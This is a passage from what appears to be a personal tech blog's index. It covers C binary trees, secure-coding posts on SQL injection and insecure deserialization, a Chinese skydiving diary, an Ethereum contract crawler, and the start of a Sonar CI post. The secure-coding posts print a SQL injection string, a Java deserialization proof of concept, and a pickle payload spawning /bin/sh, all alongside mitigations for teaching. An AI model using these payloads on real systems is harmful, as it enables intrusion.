class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n create %d 的左孩子:&quot;</span>,a);</span><br><span class="line">		binarytree_create(Root-&gt;lchild);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\r\n create %d 的右孩子:&quot;</span>,a);</span><br><span class="line">		binarytree_create(Root-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">binarytree_create(root);</span><br></pre></td></tr></table></figure>
<p>Is that right? definitely not. The code can be surely compiled successfully, but the procedure will stop at function <em>binarytree_preorder</em>. Remember? The pointer cannot be directly passed as an argument if there will be memory allocation to the pointer later. the original pointer will always stay NULL. In addition, remember to free memory in each example to avoid memory leaks if I didn’t do that.</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Secure Coding Practice - Injection</title>
    <url>/2020/10/15/Secure-Coding-Practice-Injection/</url>
    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.</p>
<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><p>The most common example acount the injection problem is SQL injection. Here we’re gonna discuss the vulnerable code and mitigation for different coding languages.</p>
<h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><p>The input from users can be arbitrary characters, if you have a query such as the one below:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">key := r.URL.Query().Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">rows, err := db.Query(<span class="string">&quot;SELECT username, password FROM accounts WHERE username = &#x27;&quot;</span> + key + <span class="string">&quot;&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>When provided a valid username value, the program will only list the matched user infomation. But when the input is 1’ or ‘1’=’1, the query will be like:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM accounts WHERE username = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<p>All the table records will be dumped with this statement because ‘1’=’1’ will be always true. Even worse, if the program has the permission for writing, the whole backend system is about to be exploited.</p>
<p>Prepared statements is the one way to keep the database safe:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">key := r.URL.Query().Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">rows, err := db.Query(<span class="string">&quot;SELECT username, password FROM accounts WHERE username = ?&quot;</span>, key)</span><br></pre></td></tr></table></figure>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>The common vulnerable implemention to query the database in Java:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT username, password FROM accounts WHERE username = &#x27;&quot;</span> + key + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">stm = con.createStatement();</span><br><span class="line">rs = stm.executeQuery(query);</span><br></pre></td></tr></table></figure>
<p>The whole database is vulnerable to the malicious input value. The proposal is to use prepared statement to protect database from arbitrary input.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT username, password FROM accounts WHERE username = ?&quot;</span>;</span><br><span class="line">ps = con.prepareStatement(query);</span><br><span class="line">ps.setString(<span class="number">1</span>, customerId);</span><br><span class="line">rs = ps.executeQuery();</span><br></pre></td></tr></table></figure>

<h3 id="MariaDB"><a href="#MariaDB" class="headerlink" title="MariaDB"></a>MariaDB</h3><p>In fact the prepared statement is the feature of database in order to improve Data retrieval efficiency, this feature can also protect database from injection attack. That means you can do prepared statements without any special API support from your programming language. If the native API is not available, the operation below can achieve the same goal.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MariaDB [security]&gt; prepare stmt from &#x27;SELECT password FROM accounts WHERE username = ?&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.008 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"> </span><br><span class="line">MariaDB [security]&gt; set @param = &quot;tester1&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"> </span><br><span class="line">MariaDB [security]&gt; execute stmt using @param;</span><br><span class="line">+----------+</span><br><span class="line">| password |</span><br><span class="line">+----------+</span><br><span class="line">| 654321   |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>
<p>All the query statement will be pre-analysed except the placeholder “?”. Placeholder syntax in prepared statements is database-specific. For example, comparing MySQL, PostgreSQL, and Oracle:</p>
<table>
<thead>
<tr>
<th align="center">MySQL</th>
<th align="center">PostgreSQL</th>
<th align="center">Oracle</th>
</tr>
</thead>
<tbody><tr>
<td align="center">WHERE col = ?</td>
<td align="center">WHERE col = $1</td>
<td align="center">WHERE col = :col</td>
</tr>
<tr>
<td align="center">VALUES(?, ?, ?)</td>
<td align="center">VALUES($1, $2, $3)</td>
<td align="center">VALUES(:val1, :val2, :val3)</td>
</tr>
</tbody></table>
<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>There are three primary defenses to avoid SQL injection:</p>
<ul>
<li>Use of Prepared Statements </li>
<li>Use of Stored Procedures(Only if stored procedure does not generate dynamic SQL)</li>
<li>Whitelist Input Validation</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://owasp.org/www-project-top-ten/2017/Top_10.html">https://owasp.org/www-project-top-ten/2017/Top_10.html</a></p>
]]></content>
      <categories>
        <category>SCP</category>
      </categories>
      <tags>
        <tag>Injection</tag>
        <tag>SQL injection</tag>
        <tag>SCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Secure Coding Practice - Insecure Deserialization</title>
    <url>/2020/12/15/Secure-Coding-Practice-Insecure-Deserialization/</url>
    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.</p>
<h2 id="Common-vulnerable-coding-example"><a href="#Common-vulnerable-coding-example" class="headerlink" title="Common vulnerable coding example"></a>Common vulnerable coding example</h2><p>Here listed some risky points for different languages</p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>Assume we have written a vulnerable program like:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>));</span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">read</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(read.command);</span><br><span class="line">        ois.close();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String command;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream stream )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                stream.defaultReadObject();</span><br><span class="line"> </span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                <span class="type">Process</span> <span class="variable">pr</span> <span class="operator">=</span> run.exec(command);</span><br><span class="line">                pr.waitFor();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(pr.getInputStream()));</span><br><span class="line">                <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">while</span> ((line=buf.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This program deserializes the input bytes file and executes the command. So it’s possible to write the exploit poc to generate the target payload.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAttack</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.command = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>));</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile and run this poc, the payload will be generated.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@tester code/java » javac VulAttack.java</span><br><span class="line">root@tester code/java » java VulAttack</span><br><span class="line">root@tester code/java » xxd payload.bin</span><br><span class="line">00000000: aced 0005 7372 0008 4d79 4f62 6a65 6374  ....sr..MyObject</span><br><span class="line">00000010: fcde 3964 7a67 2c87 0200 014c 0007 636f  ..9dzg,....L..co</span><br><span class="line">00000020: 6d6d 616e 6474 0012 4c6a 6176 612f 6c61  mmandt..Ljava/la</span><br><span class="line">00000030: 6e67 2f53 7472 696e 673b 7870 7400 0269  ng/String;xpt..i</span><br><span class="line">00000040: 64                                       d</span><br></pre></td></tr></table></figure>
<p>Now compile and run the previous vulnerable program, it will lead to RCE.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@tester code/java » javac VulnerableTaskHolder.java</span><br><span class="line">root@tester code/java » java VulnerableTaskHolder</span><br><span class="line">uid=1000(root) gid=1000(root) groups=1000(root)</span><br></pre></td></tr></table></figure>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Imagine the following code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serialization</span>(<span class="params">obj, filename</span>):</span><br><span class="line">    filename = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    pickle.dump(obj, filename)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deserialization</span>(<span class="params">filename</span>):</span><br><span class="line">    filename = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pickle.load(filename)</span><br><span class="line"> </span><br><span class="line">a = <span class="string">&quot;Hello world!&quot;</span></span><br><span class="line"> </span><br><span class="line">serialization(a, <span class="string">&#x27;file1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(deserialization(<span class="string">&#x27;file1&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>The first serialization is to write object to file and another deserialization is to convert bytes in file to object and return it. The result will be:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@tester code/python » python3 serialize.py</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure>
<p>Let’s take a look at the generated bytes file:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@tester code/python » xxd file1</span><br><span class="line">00000000: 8003 580c 0000 0048 656c 6c6f 2077 6f72  ..X....Hello wor</span><br><span class="line">00000010: 6c64 2171 002e                           ld!q..</span><br></pre></td></tr></table></figure>
<p>If the deserialized data is untrusted and can be changed to malicious data, it will lead to RCE. By comment serialization function and change file1 content to malicious data:</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;/bin/sh&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<p>It will run bash shell after running script to deserialize it, you will see bash shell open.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@tester code/python » python3 serrialize.py</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span>      </span><br><span class="line">uid=1000(root) gid=1000(root) groups=1000(root)</span><br></pre></td></tr></table></figure>

<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>The best way to protect your web application from this type of risk is not to accept serialized objects from untrusted sources. If you can’t do this, there are some technical recommendations that you can try to implement:</p>
<ul>
<li>Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.</li>
<li>Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.</li>
<li>Isolating and running code that deserializes in low privilege environments when possible.</li>
<li>Logging deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.</li>
<li>Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.</li>
<li>Monitoring deserialization, alerting if a user deserializes constantly.</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://owasp.org/www-project-top-ten/2017/Top_10.html">https://owasp.org/www-project-top-ten/2017/Top_10.html</a></p>
<p><a href="https://sucuri.net/guides/owasp-top-10-security-vulnerabilities-2020/">https://sucuri.net/guides/owasp-top-10-security-vulnerabilities-2020/</a></p>
]]></content>
      <categories>
        <category>SCP</category>
      </categories>
      <tags>
        <tag>SCP</tag>
        <tag>Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Skydive at Mission Beach</title>
    <url>/2019/10/08/Skydive-at-Mission-Beach/</url>
    <content><![CDATA[<p>跳伞在TODO list上已经躺了很久了，对于跳伞的憧憬从很小很小的时候就开始了，自从最开始在电视上看人跳伞就觉得这是我向往的运动。所幸澳大利亚得益于得天独厚的环境，正是一块跳伞胜地。这次去澳大利亚自驾游可以顺带跳伞，或者说是去跳伞顺带自驾？<br>做个决定容易，临近跳伞的那几天逐渐开始焦虑，做梦都在想绳索会在什么时候断开，要是伞包没扣紧飞了怎么办？以自由落体220km/h的速度接触海面用什么姿势能最小化受力面，同时解决海水深度不够缓冲不足的问题？脑补了一万种硬着陆的方式。<br>我们选择的跳伞地点是凯恩斯的Mission Beach，一大早从酒店出来还下雨，去海滩的一路上还担心跳伞因为天气原因取消了，所幸到了海滩阳光明媚。和我们一同前往的一车人大多数是亚洲面孔，主要是中国人和韩国人，还有几个澳大利亚本地的人。这次跳伞的体验总体来说还不赖。起初只是预定了跳伞的坑位，但是并不知道能不能预定到第三方的拍摄，也就是他们口中的“camera man”，会有另一个摄影师在空中跟拍，效果特别棒，这个通常来说很抢手，基本不可能留给临时打算预约的人，一趟飞机也只能满足一位乘客的这种拍摄需求。跟我们一趟车的一个澳大利亚本地姑娘就是提前预定的这个选项。我在临近跳伞的那几天也挺郁闷的，心想预约不到“camera man”无疑是巨大的遗憾，我本身有严重的强迫症，一旦不及自己的预期就会郁闷很长时间。但是在营地现场我看到售票员在介绍各种拍摄内容，然后我就去问了一下能不能预约“camera man”，她说没问题，她可以给我安排，在我还满头雾水的时候，幸福突然降临，我愣了几秒。她说没问题的话就可以登记付款了，然后安排妥当。我一下反应过来，那还用说，当然没问题啊！没等她把话说完我赶紧把卡拿出来塞给她，瞬间心情大好。</p>
<!-- ![](https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-1.jpg) -->
<!-- <img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-1.jpg" width="60%" height="60%"> -->
<img src="/2019/10/08/Skydive-at-Mission-Beach/pic_1.jpg" width="60%" height="60%">

<p>在我的教练给我穿装备的时候，他问我感觉怎样，我说很好，有点紧张罢了，他说“why？？”，然后拖着一个意味深长的表情，值得一提的是我看到这表情立马就轻松了许多，从他这表情里能看出异于常人的自信，遂觉稳了。后来我在降落伞打开后问他跳了多少次了，他说有几千次了，对于他们这种每天跳伞次数比上厕所次数还多的人来说，这种运动只是轻轻松松的享受罢了。这些教练都挺幽默亲切的，我们坐车从营地到机场的路上，我坐副驾驶位，开车的老头（50岁左右？）也是个话痨，还吓唬我说他们的飞机是没有舱门的，我不吃这套，whatever，坐门口的反正不是我。车子快到机场的时候教练开始各自检查自己的装备，想反悔这也是最后的机会，上了飞机就没有退路了。上飞机之前camera man跟我说了一大堆关于“give me five”之类的话，在飞机巨大的引擎声音下我大概听清楚了三分之二，反正到时候临场发挥就是了。准确地说这是个camera woman，在上车前我还奇怪这个长相甜美，声音同样甜美的妹子是跟我们去干嘛的，你能想象她现在居然要爬到飞机外面拍摄视频。。。</p>
<p>一行人站在飞机前拍了拍照，然后听从教练的指示上了飞机。起飞之前飞机舱门是开着的，直到飞机在跑道上加速的时候舱门也是开着的！就感受着强大的气流在舱门口呼啸而过！我猜在这种气压差下人是很容易被吸出去的。我不知道坐门口的中国妹子为什么如此淡定，而且门口连个扶手都没有，我刚开始只是静静地坐在自己的位子上，看到这架势立马开始找可以拽的东西，还好我左前方就有一个。这种小飞机不同于平时坐的客机，爬升的坡度特别陡，在短短几分钟之内就要上升到15000英尺的高空。我原本以为在这个高度并且视野广阔的条件下能够看到地球的曲率，就像图片里这样，真实情况是完全看不到，只是广角镜头的缘故。</p>
<!-- ![](https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-2.jpeg) -->
<img src="/2019/10/08/Skydive-at-Mission-Beach/pic_2.jpeg" width="100%" height="100%">

<p>令我诧异的是不止我一个人，同飞机的人貌似都很淡定。看着飞机穿过那一片片的云层，心里就越发平静。教练问我感觉怎么样，大概是想舒缓一下我的紧张情绪，然后跟我介绍远方的大堡礁、热带雨林，美不胜收。接着我身后的教练喊了一声”one hundred！“，过了一会儿门口的教练就把飞机舱门打开了。外面气流涌动，尽管当时有28摄氏度左右，在这个高度空气也是冰凉的。然后就眼看着门口那一排陆续跳下去了，轮到我的时候我心里没有一点起伏，没有丝毫犹豫，直接就坐在舱门口用脚勾着舱门下方，教练让我把头尽量往他肩膀上靠，所以我整个人就像一个瘫痪的病人一样和教练一起滚了下去。在从舱门口往下跳的这个阶段他们跳伞俱乐部称之为“Big jump”，对于跳伞新手来说这无疑是至暗时刻。坐在舱门口是需要勇气的，为了给教练挪位置，此时几乎半个身子已经悬在机舱外了。不过我个人认为“Big jump”是最酷的部分。</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/644HZh7PgM8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<p>跳下去的那一瞬间感觉很奇妙，不是我想象中的那种失重感，很刺激，同时又很稳，这辈子是第一次体验这种没有束缚的自由落体的感觉，纯粹的无拘无束，完全不同于过山车跳楼机。整个跳伞过程中最美好的阶段也莫过于“Free fall”阶段，小时候在电视上看别人高空跳伞很多人在空中排成各种各样的造型，我一直都非常期待有一天能体验这种感觉。失重感只发生在下落的前几秒，当达到自由落体最大速度后便没有失重感了，处于匀速下落过程。在这个高度是无法根据地面物体来判断自己的高度的，只能依靠高度计，如果身边没有云层之类的东西作参照几乎察觉不到自己在以极高的速度逼近地面。美好的时光总是短暂的，整个“Free fall”也不过1分钟左右，甚至还没来得及放空大脑去慢慢感受。<br>开伞的时候会有略微失重的感觉，不过是很短暂的。在天上翱翔了短短几分钟，尤其觉得人类幸运的是，这个星球给予人类的阳光、空气、海洋、地心引力，这一切造就了跳伞这种独一无二的运动，造就了热爱这项运动的人。借这次澳大利亚之行也结识了不少新朋友，一位跟我们同一架飞机跳伞的妹子，是来澳洲找同学玩的，首先是只身前往凯恩斯跳伞，实在是勇气可嘉。</p>
<!-- ![](https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-3.jpg) -->
<img src="/2019/10/08/Skydive-at-Mission-Beach/pic_3.jpg" width="60%" height="60%">

<p>还有一位在国内认识的妹子也是去澳洲找同学玩的，原本打算有机会的话在澳洲一起组队自驾，后来路线错开了，她也在别的海滩完成了跳伞。（PS：两位妹子的照片都是经过了别人的同意才敢往外放的）</p>
<!-- ![](https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-4.jpg) -->
<img src="/2019/10/08/Skydive-at-Mission-Beach/pic_4.jpg" width="60%" height="60%">

<!-- ![](https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-5.png) -->
<img src="/2019/10/08/Skydive-at-Mission-Beach/pic_5.jpg" width="60%" height="60%">

<p>Btw，我个人感受是有冒险精神的女生尤其具有吸引力~</p>
<p>听一位当地导游说，但凡有顾客问她”跳伞安不安全“之类的问题，她都建议顾客不要尝试了。事实上做任何事都是有风险的，即便是躺在自己卧室的床上。接受了这个基本规律，剩下的就是，相信教练，享受过程。对我而言最具价值的是，这次经历很大程度上塑造或者说强化了我的一些人生观。<br>在跟澳大利亚人交谈的过程中，从他们的字里行间能读出他们对于自然的热爱，对自然的尊敬。下至海底的腔肠动物，哪怕再低等的生物都能在这里得到尊敬。没有谁能够凌驾于谁之上，这或许是澳大利亚人与大自然相处的哲学吧。”There are always things above you.”</p>
<p>最后放上自己剪辑的全过程视频</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/G9dt75WQujQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Outdoor</tag>
      </tags>
  </entry>
  <entry>
    <title>Smart Contract Sourcecode Crawler</title>
    <url>/2018/07/09/Smart-Contract-Sourcecode-Crawler/</url>
    <content><![CDATA[<h2 id="The-method-to-crawl-the-Ethereum-blockchain"><a href="#The-method-to-crawl-the-Ethereum-blockchain" class="headerlink" title="The method to crawl the Ethereum blockchain"></a>The method to crawl the Ethereum blockchain</h2><p>The simplest way is to get all of the blocks from Etherscan.io and can save much of my local space. I’ve tried to grab all of the transactions from Etherscan.io, but my IP was banned after a few of trials. So I have to synchronize the whole node of Ethereum blockchain into my local machine. My purpose is to grab the sourcecode of the smart contract, but it’s not feasible to get the sourcecode from the bytecode itself. (Refer this question: <a href="https://ethereum.stackexchange.com/questions/26648/how-to-find-solidity-code-for-a-contract-address">https://ethereum.stackexchange.com/questions/26648/how-to-find-solidity-code-for-a-contract-address</a>)</p>
<h2 id="Get-information-by-web3"><a href="#Get-information-by-web3" class="headerlink" title="Get information by web3"></a>Get information by web3</h2><p>I used the web3.eth.getCode() method to identify whether an address is a contract or not. At first, I synchronized the whole node by adding argument –fast, and I cannot get the bytecode with web3.eth.getCode(). Maybe something was missing in this way of sync. So I deleted the database and added the argument –syncmode:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth --rpc --rpcaddr=127.0.0.1 --syncmode=full</span><br></pre></td></tr></table></figure>
<p>Then everything works well. If you don’t want to sync the node into your local disk, you can also choose the public geth node like <a href="https://infura.io/">infura</a> to use. In addition to the large usage of disk, the sync process will get extremely slower from block #2283397 to #2700031 because of the denial of service attack on 2016/09/18. (<a href="https://github.com/ethereumbook/ethereumbook/blob/develop/clients.asciidoc">https://github.com/ethereumbook/ethereumbook/blob/develop/clients.asciidoc</a>)</p>
<h2 id="Use-the-Etherscan-APIs"><a href="#Use-the-Etherscan-APIs" class="headerlink" title="Use the Etherscan APIs"></a>Use the Etherscan APIs</h2><p>Learn about how Ethereum developer APIs work: <a href="https://etherscan.io/apis">https://etherscan.io/apis</a></p>
<p>There are some useful APIs, for example:</p>
<p>Get transaction receipt:<br><a href="https://api.etherscan.io/api?module=proxy&amp;action=eth_getTransactionReceipt&amp;txhash=0x6ed68687dc6ccc5ecd17a4842c260aab1de356fdbf2d3d7ef5f8c95f5f0d2035&amp;apikey=YourApiKeyToken">https://api.etherscan.io/api?module=proxy&amp;action=eth_getTransactionReceipt&amp;txhash=0x6ed68687dc6ccc5ecd17a4842c260aab1de356fdbf2d3d7ef5f8c95f5f0d2035&amp;apikey=YourApiKeyToken</a></p>
<p>Get sourcecode:<br><a href="https://api.etherscan.io/api?module=contract&amp;action=getsourcecode&amp;address=0xc368A8E22e09CEA6e0Ca160309d94B792729892d&amp;apikey=YourApiKeyToken">https://api.etherscan.io/api?module=contract&amp;action=getsourcecode&amp;address=0xc368A8E22e09CEA6e0Ca160309d94B792729892d&amp;apikey=YourApiKeyToken</a></p>
<p>I used the getsourcecode api to get the verified contract. If the contract is not verified, this api will not work. Finally, you can check the states of your API from Etherscan.io:</p>
<img src="/2018/07/09/Smart-Contract-Sourcecode-Crawler/pic_1.png" width="60%" height="60%">

<h2 id="Separate-the-blocks-into-slices"><a href="#Separate-the-blocks-into-slices" class="headerlink" title="Separate the blocks into slices"></a>Separate the blocks into slices</h2><p>The whole Ethereum blockchain contains over 5000,000 blocks, you’d better not get all of them into your computer memory. It’s not complicated to solve it, you just need to separate the blocks into slices.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spider</span>(<span class="params">blocklist</span>):</span><br><span class="line">    transactions = []</span><br><span class="line">    <span class="comment"># blocklist = list(range(blockstart, blockend))</span></span><br><span class="line">    threadLock.acquire()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(<span class="built_in">range</span>(blockstart, blockend)) / slice_len)):</span><br><span class="line">        threadLock.acquire()</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> blocklist[<span class="number">0</span>:slice_len]:</span><br><span class="line">            transactions += (w3.eth.getBlock(block)[<span class="string">&#x27;transactions&#x27;</span>])</span><br><span class="line">        get_addr_code(transactions)</span><br><span class="line">        <span class="keyword">del</span> blocklist[<span class="number">0</span>:slice_len]</span><br><span class="line">        transactions = []</span><br><span class="line">        threadLock.release()</span><br><span class="line">    threadLock.release()</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocklist:  <span class="comment"># go over the last slice of the blocklist</span></span><br><span class="line">        transactions += (w3.eth.getBlock(block)[<span class="string">&#x27;transactions&#x27;</span>])</span><br><span class="line">    get_addr_code(transactions)</span><br></pre></td></tr></table></figure>

<h2 id="Something-tricky"><a href="#Something-tricky" class="headerlink" title="Something tricky"></a>Something tricky</h2><p>I wanted to add the multiprocessing module to accelerate the crawling process, but I failed because of some strange reasons on Mac. Finally, I used the threading module to achieve that, but the result doesn’t meet my expectations.</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Crawler</tag>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>Sonar Code Quality Gate Integration with CI - Part 1</title>
    <url>/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/</url>
    <content><![CDATA[<h2 id="Why-Sonar"><a href="#Why-Sonar" class="headerlink" title="Why Sonar"></a>Why Sonar</h2><p>There are a lot of SAST tools on the market, such as Fortify, Coverity, Infer and so on. We choose Sonar because of its open-source(partially), convenient-to-deployed, customization-friendly properties.</p>
<h2 id="About-CI"><a href="#About-CI" class="headerlink" title="About CI"></a>About CI</h2><p>For the CI system, we’re gonna talk about two platforms:</p>
<ul>
<li>Jenkins CI</li>
<li>Gitlab CI</li>
</ul>
